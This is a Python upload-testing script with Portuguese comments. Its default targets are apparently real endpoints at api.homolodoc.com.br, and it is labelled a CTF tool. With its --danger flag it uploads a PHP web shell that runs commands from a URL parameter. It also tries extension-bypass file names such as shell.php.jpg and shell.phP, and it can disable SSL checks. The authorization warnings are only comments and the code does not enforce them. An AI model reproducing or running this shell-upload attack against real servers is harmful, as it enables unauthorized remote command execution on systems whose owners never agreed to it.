#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import time
import argparse
import requests
from typing import List, Tuple
from requests.exceptions import RequestException

# AVISO: Execute apenas em ambientes autorizados (CTF / pentest com permissão).
# Por padrão enviamos payload BENIGNO; use --danger para enviar o PHP indicado.

DEFAULT_ENDPOINTS = [
    "https://api.homolodoc.com.br/upload/beneficiary",
    "https://api.homolodoc.com.br/User/document/create",
]

def build_payloads(danger: bool) -> List[Tuple[str, bytes, str]]:
    """
    Retorna uma lista de (filename, content_bytes, content_type) para testar.
    Se danger=True, inclui variantes .php; caso contrário, manda payload benigno.
    """
    benign_marker = b"CTF_UPLOAD_TEST_" + os.urandom(4).hex().encode()
    benign = [
        ("probe.txt", benign_marker, "text/plain"),
        ("probe.jpg", benign_marker, "image/jpeg"),
        ("probe.bin", benign_marker, "application/octet-stream"),
    ]
    if not danger:
        return benign

    # Payloads perigosos (use APENAS se autorizado). Conteúdo conforme pedido.
    shell_code = b'<?php system($_GET["cmd"]); ?>'
    dangerous = [
        ("shell.php", shell_code, "application/x-php"),
        ("shell.php.jpg", shell_code, "image/jpeg"),
        ("shell.phP", shell_code, "application/octet-stream"),
    ]
    # Testar também bypass simples via nome "inofensivo"
    return dangerous + benign

def summarize_response(resp: requests.Response) -> str:
    # Tenta JSON, senão texto curto
    try:
        data = resp.json()
        return json.dumps(data, ensure_ascii=False)[:400]
    except ValueError:
        text = (resp.text or "").replace("\n", " ")
        return text[:400]

def main():
    ap = argparse.ArgumentParser(description="Teste de endpoints de upload (CTF)")
    ap.add_argument("--endpoints", nargs="+", default=DEFAULT_ENDPOINTS,
                    help="Lista de URLs de upload para testar")
    ap.add_argument("--field", default="file",
                    help="Nome do campo de arquivo no formulário (default: file)")
    ap.add_argument("--extra", nargs="*", default=[],
                    help='Campos extras no corpo multipart, no formato chave=valor (ex: "type=document")')
    ap.add_argument("--timeout", type=int, default=15, help="Timeout da requisição (s)")
    ap.add_argument("--sleep", type=float, default=0.4, help="Intervalo entre requisições")
    ap.add_argument("--danger", action="store_true",
                    help="Envia payload PHP (use somente com autorização)")
    ap.add_argument("--insecure", action="store_true",
                    help="Ignora verificação SSL (verify=False)")
    ap.add_argument("--bearer", default=os.getenv("API_BEARER"),
                    help="Token Bearer (Authorization: Bearer <token>)")
    ap.add_argument("--apikey", default=os.getenv("API_KEY"),
                    help="Chave de API (x-api-key)")
    args = ap.parse_args()

    # SSL warnings off se insecure
    if args.insecure:
        try:
            import urllib3
            from urllib3.exceptions import InsecureRequestWarning
            urllib3.disable_warnings(InsecureRequestWarning)
        except Exception:
            pass

    # Campos extras
    extra_fields = {}
    for kv in args.extra:
        if "=" in kv:
            k, v = kv.split("=", 1)
            extra_fields[k] = v

    headers = {
        "User-Agent": "CTF-UploadTester/1.0",
        "Accept": "application/json, text/plain, */*",
    }
    if args.bearer:
        headers["Authorization"] = f"Bearer {args.bearer}"
    if args.apikey:
        headers["x-api-key"] = args.apikey

    session = requests.Session()
    session.headers.update(headers)

    files_to_try = build_payloads(args.danger)

    print(f"[i] Endpoints: {len(args.endpoints)} | Payloads: {len(files_to_try)} | Campo: {args.field}")
    if extra_fields:
        print(f"[i] Campos extras: {extra_fields}")
    print(f"[i] SSL verify: {not args.insecure} | timeout: {args.timeout}s")

    for ep in args.endpoints:
        print(f"\n=== Endpoint: {ep} ===")
        for fname, content, ctype in files_to_try:
            files = {args.field: (fname, content, ctype)}
            try:
                resp = session.post(
                    ep,
                    files=files,
                    data=extra_fields if extra_fields else None,
                    timeout=args.timeout,
                    verify=not args.insecure,
                )
                summary = summarize_response(resp)
                # Alguns servidores retornam Location ou caminho do arquivo salvo
                location = resp.headers.get("Location") or resp.headers.get("Content-Location")
                print(f"[{resp.status_code}] {fname} ({ctype}) "
                      f"{'LOC='+location if location else ''} "
                      f"BODY={summary}")
                # Rate limit básico
                if resp.status_code == 429:
                    time.sleep(2.0)
            except RequestException as e:
                print(f"[ERR] {fname} ({ctype}) -> {e}")
            time.sleep(args.sleep)

if __name__ == "__main__":
    main()
